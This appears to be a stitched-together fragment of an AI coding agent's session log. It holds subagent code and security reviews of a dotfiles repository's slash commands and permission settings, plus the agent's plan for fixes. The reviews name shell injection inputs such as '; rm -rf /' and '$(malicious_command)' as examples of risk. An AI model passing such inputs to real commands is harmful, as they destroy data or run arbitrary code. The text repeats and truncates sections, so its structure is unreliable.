`$ARGUMENTS` is used within a procedure step.\n\n**Improvement:** Standardize the `$ARGUMENTS` injection pattern. Consider placing all `$ARGUMENTS` references in a consistent location (e.g., under the \"Usage\" section or under a dedicated \"Arguments\" section) across all commands that accept arguments.\n\n---\n\n### [Medium] Inconsistent fallback patterns in dynamic context\n\n**Files affected:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`: Uses `2>/dev/null || <fallback>` pattern for PR number-optional commands\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md`, line 16: Uses `2>/dev/null || echo \"PRが見つかりません\"` (fallback to echo)\n- `/Users/yuki.tanaami/src/dotfiles/commands/test-create.md`, line 18: Uses `2>/dev/null;` (semicolon, not `||`) to chain two git diff commands\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md`: No fallback patterns at all (assumes `$0` is always provided)\n\nThe `test-create.md` uses `;` instead of `||` on line 18:\n```\n!`git diff --name-only HEAD 2>/dev/null; git diff --name-only --cached 2>/dev/null`\n```\n\nThis is technically correct (both commands should run), but it differs from the `||` fallback pattern used elsewhere. This is actually the right behavior here since both staged and unstaged changes should be listed, but a comment explaining this would help maintainability.\n\n**Improvement:** Add a brief comment or standardize the approach. Also, `pr-review.md` has no fallback for missing `$0`, meaning if a user runs `/pr-review` without arguments, all four `gh pr view $0` commands will fail. Consider adding the same fallback pattern used in `pr-fix.md`.\n\n---\n\n### [Medium] `allowed-tools` inconsistencies\n\nComparing `allowed-tools` across commands:\n\n| Command | Write/Edit | Linters | WebFetch | npm/npx |\n|---------|-----------|---------|----------|---------|\n| `pr-review.md` | No | No | Yes | No |\n| `pr-fix.md` | Yes | No | Yes | Yes |\n| `ci-fix.md` | Yes | Yes (ruff, golangci-lint) | No | Yes |\n| `review-diff.md` | No | Yes (ruff, golangci-lint) | No | Yes (npm, npx) |\n| `test-create.md` | Yes (Write only) | No | No | Yes |\n| `commit.md` | No | No | No | No |\n| `commit-split.md` | No | No | No | No |\n| `pr-zero.md` | No | No | No | No |\n\nObservations:\n1. `review-diff.md` includes `Bash(npm *)` and `Bash(npx *)` but no `Write` or `Edit`. If the review command runs linters with auto-fix (e.g., `npx eslint --fix`), it would modify files but lacks `Write`/`Edit` permissions. However, since the command description says it only reviews (read-only), including `npm`/`npx` seems unnecessary unless it runs linters in check-only mode. If linters are run in check mode only, then `npm`/`npx` is fine, but `Bash(ruff *)` and `Bash(golangci-lint *)` could potentially auto-fix without `Write` permission.\n\n2. `ci-fix.md` includes `Bash(ruff *)` and `Bash(golangci-lint *)` but `pr-fix.md` does not. Since `pr-fix.md` also handles CI errors (line 29: \"lint/type/test/build エラーを自動修正\"), it should probably include linter tools as well.\n\n3. `test-create.md` includes `Write` but not `Edit`. If generating tests requires modifying existing test files, `Edit` would be needed.\n\n**Improvement:**\n- Add `Bash(ruff *)` and `Bash(golangci-lint *)` to `pr-fix.md` since it handles CI lint errors.\n- Add `Edit` to `test-create.md` for modifying existing test files.\n- Consider removing `Bash(npm *)` and `Bash(npx *)` from `review-diff.md` if it is strictly read-only, or add `Write`/`Edit` if auto-fix is intended.\n\n---\n\n### [Low] Frontmatter consistency -- minor field ordering differences\n\nAll 8 files use YAML frontmatter with `description` and `allowed-tools`. Some also have `argument-hint`. The field order is consistent: `description`, then `argument-hint` (when present), then `allowed-tools`. This is good.\n\nHowever, `ci-fix.md` and `commit.md` do not have `argument-hint` (correctly, since they take no arguments), while `commit-split.md` has `argument-hint` for optional parameters. This is appropriate and consistent.\n\nNo issues found here.\n\n---\n\n### [Low] `commit-split.md` uses `$0` and `$1` but documents them as positional inside the body\n\n**File:** `/Users/yuki.tanaami/src/dotfiles/commands/commit-split.md`, lines 17-18\n\n```markdown\n- ベースブランチ ($0): 比較対象（省略時はmaster/mainを自動検出）\n- 分割方式 ($1): `file`（ファイル単位）、`feature`（機能単位）、`interactive`（インタラクティブ）\n```\n\nThese `$0` and `$1` references are documentation only and are not used in any `!` backtick dynamic context injection. If Claude Code does not automatically substitute `$0`/`$1` in plain text (only in `!` backtick blocks), these serve as documentation hints rather than functional substitutions. This is fine but differs from how `pr-review.md` and `pr-fix.md` use `$0` inside `!` backtick commands where it is functionally substituted.\n\nNo action required, but worth noting for documentation clarity.\n\n---\n\n### [Low] `settings.json` -- `Bash(grep:*)` permission is redundant\n\n**File:** `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json`, line 108\n\nThe `Grep` tool is already in the `allow` list (line 87: `\"Read\"`). Additionally, Claude Code's built-in `Grep` tool (which this review agent uses) is separate from `Bash(grep:*)`. Having both `Grep` (the native tool) allowed and `Bash(grep:*)` allowed means grep can be invoked two ways. This is not harmful but is slightly redundant. The native `Grep` tool is generally preferred as noted in the tool description (\"ALWAYS use Grep for search tasks. NEVER invoke `grep` or `rg` as a Bash command\").\n\n**Improvement:** Consider removing `Bash(grep:*)` since the native `Grep` tool is available and preferred.\n\n---\n\n## Summary\n\n| Severity | Count | Key Issues |\n|----------|-------|------------|\n| Critical | 1 | `{owner}/{repo}` placeholder in `pr-fix.md` will not be resolved |\n| High | 0 | -- |\n| Medium | 3 | Inconsistent `$ARGUMENTS` usage; inconsistent fallback patterns; `allowed-tools` mismatches |\n| Low | 3 | Frontmatter is consistent; `$0`/`$1` doc-only references; redundant `Bash(grep:*)` |\n\nThe most important issue to address is the **Critical** finding in `pr-fix.md` where the `{owner}/{repo}` literal will cause the GitHub API call to fail.

I'll handle Critical and Medium items, and assess Low items.\n\nCritical:\n1. Fix `{owner}/{repo}` in pr-fix.md - use `gh repo view --json nameWithOwner -q .nameWithOwner`\n\nMedium:\n2. Tighten `allowed-tools` across all commands - YES, fix\n3. Add linter tools to pr-fix.md - YES\n4. Add Edit to test-create.md - YES\n5. Add fallback for $0 in pr-review.md - YES\n6. review-diff.md: remove npm/npx since it's read-only, or clarify - since review-diff runs linter checks but doesn't auto-fix, it should keep npm/npx for check-only mode. Actually, the command says \"自動チェックツール実行\" which is check mode. \n\nFor review-diff.md, the \"修正に入るか確認\" suggests fixing happens after review, so npm/npx is needed for running checks but Write/Edit aren't needed until the fix phase. I'll keep it as-is since linter check commands don't require Write permissions.\n7. Standardize $ARGUMENTS placement - YES\n\nLow:\n8-11. Bash(grep:*), mcp__playwright__*, .entire/metadata/** deny path, and the command issue are all in settings.json which isn't part of my changes, so I'll skip those.\n\nActually, wait—settings.json IS in the diff. Let me check what actually changed... The diff shows settings.json was reorganized with fields reordered and new hooks/deny rules added, but items 8-10 are pre-existing content, not new changes. I should focus on the command file changes since that's what matters here.\n\nMy priorities are fixing pr-fix.md to resolve {owner}/{repo} and add linter tools, adding a fallback for missing $0 in pr-review.md, adding Edit to test-create.md, tightening allowed-tools across all commands, and standardizing $ARGUMENTS placement. The security reviewer wants specificity in allowed-tools, but being too restrictive creates problems.\n\nI'm realizing the command-level allowed-tools grant additional permissions on top of what settings.json already restricts, so overly broad rules during command execution are a real concern. But being too granular makes maintenance harder and might break when new subcommands are needed. I need to find the practical middle ground—keeping read operations flexible while being strict about write operations.\n\nNow I'm scoping each command's tool access more carefully. For read-only commands like pr-review, I'm limiting to specific gh subcommands for viewing and checking status. For write commands like pr-fix and ci-fix, I need broader access to handle comments and API calls. I'm also mapping out git operations—add, commit, and push for the commit command—and defining what gh auth and pr create need for pr-zero.\n\nActually, I'm realizing the git restrictions are getting unwieldy with all the subcommand specificity. The practical move is to keep full git access for commands that genuinely need to write, while tightening gh permissions where I can. I'll focus on the highest-risk issues rather than trying to perfectly restrict every

Command Injection via `$0` / `$ARGUMENTS` in Dynamic Context\n\n**Severity: Medium**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (lines 18-21)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md` (lines 17-20)\n- `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md` (line 23)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 24)\n\n**Description:** The `!` backtick dynamic context injection syntax substitutes `$0` and `$ARGUMENTS` directly into shell commands. For example:\n\n```\n!`gh pr view $0 --json title,body,url,number 2>/dev/null || ...`\n```\n\nIf a user passes a crafted argument containing shell metacharacters (e.g., `; rm -rf /` or `$(malicious_command)`), it could be interpreted by the shell. However, the practical risk is **mitigated** by the fact that:\n- These are slash commands invoked by the local user themselves.\n- The user controls the input directly (they type `/pr-review 42`).\n- Claude Code likely sanitizes or quotes these substitutions before execution.\n\n**Improvement:** Confirm with Claude Code documentation whether `$0`/`$ARGUMENTS` substitutions are shell-escaped. If not, consider wrapping them in quotes within the commands, e.g., `gh pr view \"$0\"` instead of `gh pr view $0`. This is a defense-in-depth measure.\n\n---\n\n### 2. Overly Broad `Bash(git *)` Permission\n\n**Severity: Medium**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/commit.md` (line 3)\n- `/Users/yuki.tanaami/src/dotfiles/commands/commit-split.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md` (line 3)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 4)\n\n**Description:** `Bash(git *)` allows execution of any git subcommand, including destructive operations like `git push --force`, `git rebase`, `git reset --hard`, `git clean -fd`, and `git filter-branch`. The commands themselves state \"do not use `git checkout`, `git restore`, `git reset`, `git stash`\" -- but the permission model does not enforce this restriction.\n\nNotably, the global `settings.json` (lines 100-106) already uses scoped git permissions (`Bash(git add:*)`, `Bash(git branch:*)`, etc.), so there is an inconsistency: the command frontmatter grants broader permissions than the global settings.\n\n**Improvement:** Scope `Bash(git *)` in command frontmatter to only the specific git subcommands needed. For example, `commit.md` only needs `Bash(git add *)`, `Bash(git commit *)`, `Bash(git push *)`, `Bash(git status *)`, `Bash(git diff *)`, `Bash(git log *)`. This aligns with the principle of least privilege and matches the approach already taken in `settings.json`.\n\n---\n\n### 3. `Bash(gh api *)` Permission in pr-fix.md\n\n**Severity: Medium**\n**File:** `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (line 4)\n\n**Description:** The `allowed-tools` includes `Bash(gh api *)`, which allows arbitrary GitHub API calls. This is powerful -- it can create/delete repos, manage webhooks, modify organization settings, etc. The intended use is only to fetch PR review comments:\n\n```\ngh api repos/$(gh repo view --json nameWithOwner -q .nameWithOwner)/pulls/.../comments\n```\n\nThe nested command substitution `$(gh repo view ...)` within the `gh api` call is safe in itself (it resolves the repo name dynamically), but the broad `gh api *` permission is concerning.\n\n**Improvement:** If Claude Code's permission system supports it, scope the API permission more narrowly, e.g., `Bash(gh api repos/*)` to restrict to repository-scoped API calls only. Alternatively, consider using `gh pr view --json reviews,comments` instead of the raw API call, which would eliminate the need for `gh api` entirely.\n\n---\n\n### 4. `Bash(gh auth *)` Permission in pr-zero.md\n\n**Severity: Low**\n**File:** `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 4)\n\n**Description:** `Bash(gh auth *)` is included to handle re-authentication (`gh auth refresh -s repo,read:org`). However, this also permits `gh auth login`, `gh auth token` (which prints the token), and `gh auth switch`. The `gh auth token` subcommand is particularly sensitive as it could expose the GitHub token.\n\n**Improvement:** Scope to `Bash(gh auth refresh *)` or `Bash(gh auth status *)` only, depending on the actual needs.\n\n---\n\n### 5. `2>/dev/null || fallback` Pattern Suppresses Error Diagnostics\n\n**Severity: Low**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (lines 18-21)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md` (lines 17-20)\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md` (line 16)\n\n**Description:** The pattern `gh pr view $0 ... 2>/dev/null || gh pr view ...` silences stderr and falls back to the no-argument version. This is functionally correct but has two concerns:\n- Authentication errors, permission errors, or network failures are silently swallowed, potentially causing the fallback command to also fail silently.\n- If both sides fail, the dynamic context injection may produce empty or misleading output without any error indication.\n\nThis is not a direct security vulnerability but could mask security-relevant failures (e.g., expired token, insufficient permissions).\n\n**Improvement:** Consider redirecting stderr to a temporary diagnostic rather than `/dev/null`, or at minimum add an `echo` in the fallback path that indicates the first command failed. For example:\n```\ngh pr view $0 ... 2>/dev/null || { echo \"[warn] PR number not provided, using current branch\"; gh pr view ...; }\n```\n\n---\n\n### 6. Deny Rule Path Format for `.entire/metadata/**`\n\n**Severity: Low**\n**File:** `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json` (line 117)\n\n**Description:** The deny rule is `Read(./.entire/metadata/**)`. The `./` relative prefix may or may not be interpreted correctly depending on how Claude Code resolves paths. If Claude Code uses absolute paths internally, this rule might not match.\n\n**Improvement:** Verify that `./` is correctly resolved by Claude Code. Consider using the path without `./` prefix (i.e., `Read(.entire/metadata/**)`) or confirm the behavior in the official documentation. This aligns with the project's CLAUDE.md instruction to check official documentation before making changes related to Claude Code.\n\n---\n\n### 7. Hooks Executing External CLI (`entire`)\n\n**Severity: Low**\n**File:** `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json` (lines 7-82)\n\n**Description:** All hooks execute the `entire` CLI tool (e.g., `entire hooks claude-code session-start`, `entire hooks claude-code post-task`). This tool runs on every session start/end, every prompt submission, every Task/TodoWrite tool use, and every stop event. Security considerations:\n- The `entire` binary must be trusted, as it receives execution context from Claude Code on every interaction.\n- If `entire` is compromised or replaced (e.g., PATH manipulation), all Claude Code sessions would be affected.\n- The hooks fire automatically without user confirmation.\n\n**Improvement:** This is acceptable if `entire` is a known, trusted tool installed via a verified method. Ensure the `entire` binary is installed from a trusted source and consider pinning its version. No immediate action needed if this is an intentional integration.\n\n---\n\n### 8. No Issues Found\n\n**Files:**\n- `README.md` changes (removing MCP servers and tools) -- no security concern, purely documentation.\n- `test-create.md` and `review-diff.md` -- `allowed-tools` are appropriately scoped with specific commands (`Bash(git diff *)`, `Bash(npm *)`, linting tools, and read-only tools).\n\n---\n\n## Summary Table\n\n| # | Severity | File | Issue |\n|---|----------|------|-------|\n| 1 | Medium | `commands/pr-fix.md`, `pr-review.md`, `review-diff.md`, `pr-zero.md` | `$0`/`$ARGUMENTS` injection in dynamic context |\n| 2 | Medium | `commands/commit.md`, `commit-split.md`, `pr-fix.md`, `ci-fix.md`, `pr-zero.md` | `Bash(git *)` overly broad vs scoped settings.json |\n| 3 | Medium | `commands/pr-fix.md` | `Bash(gh api *)` allows arbitrary API calls |\n| 4 | Low | `commands/pr-zero.md` | `Bash(gh auth *)` could expose tokens |\n| 5 | Low | `commands/pr-fix.md`, `pr-review.md`, `ci-fix.md` | `2>/dev/null` suppresses security-relevant errors |\n| 6 | Low | `.claude/settings.json` | Deny rule `./` prefix may not resolve correctly |\n| 7 | Low | `.claude/settings.json` | Hooks execute external `entire` CLI on all events |\n\n**Critical: 0 | High: 0 | Medium: 3 | Low: 4**\n\nThe most actionable improvements are items 2 and 3: scoping `Bash(git *)` to specific subcommands (matching the existing pattern in `settings.json`) and narrowing `Bash(gh api *)` to repository-scoped calls or replacing it with `gh pr view --json` fields."},{"type":"text","text":"agentId: af8fc19 (for resuming to continue this agent's work if needed)\n<usage>total_tokens: 18285\ntool_uses: 10\nduration_ms: 64580</usage>"}]}]},"uuid":"8c983d37-b0dd-40b3-bb0e-321f099eb162","timestamp":"2026-02-15T13:20:01.571Z","toolUseResult":{"status":"completed","prompt":"Review the current changes in /Users/yuki.tanaami/src/dotfiles for security issues.

Command Injection via `$0` / `$ARGUMENTS` in Dynamic Context\n\n**Severity: Medium**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (lines 18-21)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md` (lines 17-20)\n- `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md` (line 23)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 24)\n\n**Description:** The `!` backtick dynamic context injection syntax substitutes `$0` and `$ARGUMENTS` directly into shell commands. For example:\n\n```\n!`gh pr view $0 --json title,body,url,number 2>/dev/null || ...`\n```\n\nIf a user passes a crafted argument containing shell metacharacters (e.g., `; rm -rf /` or `$(malicious_command)`), it could be interpreted by the shell. However, the practical risk is **mitigated** by the fact that:\n- These are slash commands invoked by the local user themselves.\n- The user controls the input directly (they type `/pr-review 42`).\n- Claude Code likely sanitizes or quotes these substitutions before execution.\n\n**Improvement:** Confirm with Claude Code documentation whether `$0`/`$ARGUMENTS` substitutions are shell-escaped. If not, consider wrapping them in quotes within the commands, e.g., `gh pr view \"$0\"` instead of `gh pr view $0`. This is a defense-in-depth measure.\n\n---\n\n### 2. Overly Broad `Bash(git *)` Permission\n\n**Severity: Medium**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/commit.md` (line 3)\n- `/Users/yuki.tanaami/src/dotfiles/commands/commit-split.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (line 4)\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md` (line 3)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 4)\n\n**Description:** `Bash(git *)` allows execution of any git subcommand, including destructive operations like `git push --force`, `git rebase`, `git reset --hard`, `git clean -fd`, and `git filter-branch`. The commands themselves state \"do not use `git checkout`, `git restore`, `git reset`, `git stash`\" -- but the permission model does not enforce this restriction.\n\nNotably, the global `settings.json` (lines 100-106) already uses scoped git permissions (`Bash(git add:*)`, `Bash(git branch:*)`, etc.), so there is an inconsistency: the command frontmatter grants broader permissions than the global settings.\n\n**Improvement:** Scope `Bash(git *)` in command frontmatter to only the specific git subcommands needed. For example, `commit.md` only needs `Bash(git add *)`, `Bash(git commit *)`, `Bash(git push *)`, `Bash(git status *)`, `Bash(git diff *)`, `Bash(git log *)`. This aligns with the principle of least privilege and matches the approach already taken in `settings.json`.\n\n---\n\n### 3. `Bash(gh api *)` Permission in pr-fix.md\n\n**Severity: Medium**\n**File:** `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (line 4)\n\n**Description:** The `allowed-tools` includes `Bash(gh api *)`, which allows arbitrary GitHub API calls. This is powerful -- it can create/delete repos, manage webhooks, modify organization settings, etc. The intended use is only to fetch PR review comments:\n\n```\ngh api repos/$(gh repo view --json nameWithOwner -q .nameWithOwner)/pulls/.../comments\n```\n\nThe nested command substitution `$(gh repo view ...)` within the `gh api` call is safe in itself (it resolves the repo name dynamically), but the broad `gh api *` permission is concerning.\n\n**Improvement:** If Claude Code's permission system supports it, scope the API permission more narrowly, e.g., `Bash(gh api repos/*)` to restrict to repository-scoped API calls only. Alternatively, consider using `gh pr view --json reviews,comments` instead of the raw API call, which would eliminate the need for `gh api` entirely.\n\n---\n\n### 4. `Bash(gh auth *)` Permission in pr-zero.md\n\n**Severity: Low**\n**File:** `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 4)\n\n**Description:** `Bash(gh auth *)` is included to handle re-authentication (`gh auth refresh -s repo,read:org`). However, this also permits `gh auth login`, `gh auth token` (which prints the token), and `gh auth switch`. The `gh auth token` subcommand is particularly sensitive as it could expose the GitHub token.\n\n**Improvement:** Scope to `Bash(gh auth refresh *)` or `Bash(gh auth status *)` only, depending on the actual needs.\n\n---\n\n### 5. `2>/dev/null || fallback` Pattern Suppresses Error Diagnostics\n\n**Severity: Low**\n**Files:**\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md` (lines 18-21)\n- `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md` (lines 17-20)\n- `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md` (line 16)\n\n**Description:** The pattern `gh pr view $0 ... 2>/dev/null || gh pr view ...` silences stderr and falls back to the no-argument version.

For example:\n```\ngh pr view $0 ... 2>/dev/null || { echo \"[warn] PR number not provided, using current branch\"; gh pr view ...; }\n```\n\n---\n\n### 6. Deny Rule Path Format for `.entire/metadata/**`\n\n**Severity: Low**\n**File:** `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json` (line 117)\n\n**Description:** The deny rule is `Read(./.entire/metadata/**)`.

Frontmatter Consistency Across Command Files\n\n**Severity: Medium**\n**Files: All 8 command files under `/Users/yuki.tanaami/src/dotfiles/commands/`**\n\nAll 8 files use the YAML frontmatter format (`---` delimited) consistently with the following fields:\n\n| File | `description` | `argument-hint` | `allowed-tools` |\n|------|:---:|:---:|:---:|\n| `commit.md` | Yes | No | Yes |\n| `commit-split.md` | Yes | Yes | Yes |\n| `pr-fix.md` | Yes | Yes | Yes |\n| `pr-review.md` | Yes | Yes | Yes |\n| `ci-fix.md` | Yes | No | Yes |\n| `test-create.md` | Yes | Yes | Yes |\n| `review-diff.md` | Yes | Yes | Yes |\n| `pr-zero.md` | Yes | Yes | Yes |\n\nThe format is consistent. `commit.md` and `ci-fix.md` omit `argument-hint`, which is correct since they take no arguments. No issues found here.\n\n---\n\n### 2. Dynamic Context Injection (`!` backtick commands)\n\n**Severity: High**\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 19**\n\nThe review comments fetch command is problematic:\n\n```\n!`gh api repos/$(gh repo view --json nameWithOwner -q .nameWithOwner)/pulls/$(gh pr view $0 --json number -q .number 2>/dev/null || gh pr view --json number -q .number)/comments 2>/dev/null`\n```\n\n**Issues:**\n- **Nested command substitutions inside dynamic context injection**: This command contains `$(...)` nested within `` !`...` ``. The behavior depends on how Claude Code's dynamic context injection processes these. If it passes the string to a shell, it should work, but this is fragile.\n- **The `2>/dev/null` at the end suppresses ALL errors**, including authentication failures, network errors, or incorrect repository names. If this command fails silently, the agent will proceed with no review comments and may skip legitimate review items.\n- **Double evaluation of `$0`**: The inner `gh pr view $0` and the outer `gh pr view $0` in line 18 both reference `$0`. If `$0` is empty (no PR number provided), both fall back correctly, but the nested structure makes this harder to debug.\n\n**Recommendation:** Consider splitting into two steps or using `gh pr view` with `--json comments` if available, to avoid the deeply nested command substitution. At minimum, change the outer `2>/dev/null` to a fallback with an error message like the pattern used in `ci-fix.md` line 16:\n```\n|| echo \"レビューコメントを取得できません\"\n```\n\n---\n\n### 3. Fallback Pattern Consistency (`2>/dev/null || fallback`)\n\n**Severity: Medium**\n**Files: Multiple command files**\n\nThree different fallback patterns are used:\n\n| Pattern | Used in |\n|---------|---------|\n| `2>/dev/null \\|\\| gh pr ... ` (fallback to no-arg version) | `pr-fix.md`, `pr-review.md` |\n| `2>/dev/null \\|\\| echo \"...\"` (fallback to message) | `ci-fix.md` (line 16) |\n| `2>/dev/null` only (silent failure) | `pr-fix.md` (line 19, the `gh api` call) |\n| No fallback at all | `commit.md`, `commit-split.md`, `test-create.md`, `review-diff.md`, `pr-zero.md` |\n\nThe commands that take no `$0` argument (`commit.md`, `ci-fix.md`, `review-diff.md`, `pr-zero.md`) reasonably have no fallback since there is no optional parameter. However, `test-create.md` line 18 uses:\n```\n!`git diff --name-only HEAD 2>/dev/null; git diff --name-only --cached 2>/dev/null`\n```\nThis uses `;` (unconditional sequential) rather than `||` (conditional fallback), which is actually correct here since both commands should run. This is fine.\n\nThe inconsistency is specifically that `pr-fix.md` line 19 silently swallows errors with just `2>/dev/null` while all other PR-related commands provide a fallback. This should be addressed.\n\n---\n\n### 4. `$ARGUMENTS` Placement Consistency\n\n**Severity: Low**\n**Files: `/Users/yuki.tanaami/src/dotfiles/commands/test-create.md` (line 21), `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md` (line 23), `/Users/yuki.tanaami/src/dotfiles/commands/pr-zero.md` (line 24)**\n\nThree files use `$ARGUMENTS`:\n- `test-create.md` line 21: `指定ファイル ($ARGUMENTS) を対象にする` -- embedded in a sentence within the procedure steps\n- `review-diff.md` line 23: `指定された対象: $ARGUMENTS（省略時は全変更）` -- standalone section under `## 対象`\n- `pr-zero.md` line 24: `$ARGUMENTS` -- standalone, bare, under `## オプション`\n\nThe placement approach differs across files. `review-diff.md` provides the best pattern because it clearly labels the argument and describes the fallback behavior. `pr-zero.md`'s bare `$ARGUMENTS` under `## オプション` provides no context about what the argument means.\n\n**Recommendation:** Standardize to the `review-diff.md` pattern, e.g., in `pr-zero.md`:\n```markdown\n## オプション\n指定されたオプション: $ARGUMENTS（省略時はオプションなし）\n```\n\n---\n\n### 5. `allowed-tools` Alignment with Actual Needs\n\n**Severity: Medium**\n\n#### 5a. `commit.md` and `commit-split.md` -- `Bash(git *)`\n\nThese use the broad `Bash(git *)` wildcard. However, both files explicitly prohibit `git checkout`, `git restore`, `git reset`, `git stash`. The `allowed-tools` wildcard still permits these commands, relying solely on the instruction text to prevent their use.\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/commit.md`, line 3**\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/commit-split.md`, line 4**\n\n**Recommendation:** This is acceptable since `allowed-tools` is a permission grant, not a restriction, and the instructions provide the behavioral constraint. No action required but worth noting.\n\n#### 5b. `pr-fix.md` -- Missing `Bash(gh run view *)`\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 4**\n\nThe command fixes CI errors but only has `Bash(gh pr *)` for CI checks. To investigate CI failure logs in detail, `Bash(gh run view *)` and `Bash(gh run list *)` may be needed. The `ci-fix.md` also lacks `Bash(gh run view *)`.\n\n**Recommendation:** Consider adding `Bash(gh run view *)` to both `pr-fix.md` and `ci-fix.md` if CI log inspection is needed.\n\n#### 5c. `pr-fix.md` -- Has `Bash(gh api *)` but no other command has it\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 4**\n\nOnly `pr-fix.md` includes `Bash(gh api *)`. This is needed for the review comments fetch on line 19. However, `pr-review.md` does NOT include `Bash(gh api *)` even though it might benefit from accessing review comments through the API.\n\n**Recommendation:** Verify whether `pr-review.md` needs `Bash(gh api *)` for fetching review comments, or if it intentionally relies only on `gh pr view` data.\n\n#### 5d. `pr-review.md` -- Missing `Bash(gh issue view *)`\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-review.md`, line 4**\n\nThe `pr-compliance-review` skill (which `pr-review.md` uses via the `code-reviewer` subagent) requires `gh issue view` to fetch linked GitHub Issues. However, `pr-review.md`'s `allowed-tools` does not include `Bash(gh issue view *)`. This may cause the subagent to fail when performing PR compliance checks.\n\n**Recommendation:** Add `Bash(gh issue view *)` to `pr-review.md`'s `allowed-tools` if the subagent inherits the parent command's tool permissions.\n\n#### 5e. `ci-fix.md` -- Missing `Bash(gh pr view *)`\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/ci-fix.md`, line 3**\n\n`ci-fix.md` uses `gh pr checks` in its dynamic context injection but only has `Bash(gh pr checks *)` in allowed-tools. If the agent needs to view PR details during debugging, `Bash(gh pr view *)` would be needed.\n\n#### 5f. `review-diff.md` -- Has specific subcommand patterns\n\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/review-diff.md`, line 4**\n\nThis file uses specific patterns like `Bash(git status *)` and `Bash(git diff *)` instead of the broad `Bash(git *)` used by `commit.md`. This is more restrictive and precise, which is better security practice, but inconsistent with other files.\n\n---\n\n### 6. Security: `settings.json` Deny Rules\n\n**Severity: Low**\n**File: `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json`, lines 116-118**\n\n```json\n\"deny\": [\n  \"Read(./.entire/metadata/**)\"\n]\n```\n\nThe deny rule uses a relative path (`./`). This should work correctly as Claude Code resolves paths relative to the project root. However, the `.entire/` directory appears in the git status as untracked (`?? .entire/`), suggesting it is a new addition. The deny rule prevents reading metadata from this directory, which is appropriate for protecting internal plugin/tool metadata.\n\nNo issue found.\n\n---\n\n### 7. Security: `settings.json` Hooks -- External Command Execution\n\n**Severity: Medium**\n**File: `/Users/yuki.tanaami/src/dotfiles/.claude/settings.json`, lines 7-82**\n\nAll hooks execute `entire hooks claude-code <event>` commands. The `entire` command appears to be an external CLI tool.

Frontmatter Consistency Across Command Files\n\n**Severity: Medium**\n**Files: All 8 command files under `/Users/yuki.tanaami/src/dotfiles/commands/`**\n\nAll 8 files use the YAML frontmatter format (`---` delimited) consistently with the following fields:\n\n| File | `description` | `argument-hint` | `allowed-tools` |\n|------|:---:|:---:|:---:|\n| `commit.md` | Yes | No | Yes |\n| `commit-split.md` | Yes | Yes | Yes |\n| `pr-fix.md` | Yes | Yes | Yes |\n| `pr-review.md` | Yes | Yes | Yes |\n| `ci-fix.md` | Yes | No | Yes |\n| `test-create.md` | Yes | Yes | Yes |\n| `review-diff.md` | Yes | Yes | Yes |\n| `pr-zero.md` | Yes | Yes | Yes |\n\nThe format is consistent. `commit.md` and `ci-fix.md` omit `argument-hint`, which is correct since they take no arguments. No issues found here.\n\n---\n\n### 2. Dynamic Context Injection (`!` backtick commands)\n\n**Severity: High**\n**File: `/Users/yuki.tanaami/src/dotfiles/commands/pr-fix.md`, line 19**\n\nThe review comments fetch command is problematic:\n\n```\n!`gh api repos/$(gh repo view --json nameWithOwner -q .nameWithOwner)/pulls/$(gh pr view $0 --json number -q .number 2>/dev/null || gh pr view --json number -q .number)/comments 2>/dev/null`\n```\n\n**Issues:**\n- **Nested command substitutions inside dynamic context injection**: This command contains `$(...)` nested within `` !`...` ``. The behavior depends on how Claude Code's dynamic context injection processes these. If it passes the string to a shell, it should work, but this is fragile.\n- **The `2>/dev/null` at the end suppresses ALL errors**, including authentication failures, network errors, or incorrect repository names. If this command fails silently, the agent will proceed with no review comments and may skip legitimate review items.\n- **Double evaluation of `$0`**: The inner `gh pr view $0` and the outer `gh pr view $0` in line 18 both reference `$0`. If `$0` is empty (no PR number provided), both fall back correctly, but the nested structure makes this harder to debug.\n\n**Recommendation:** Consider splitting into two steps or using `gh pr view` with `--json comments` if available, to avoid the deeply nested 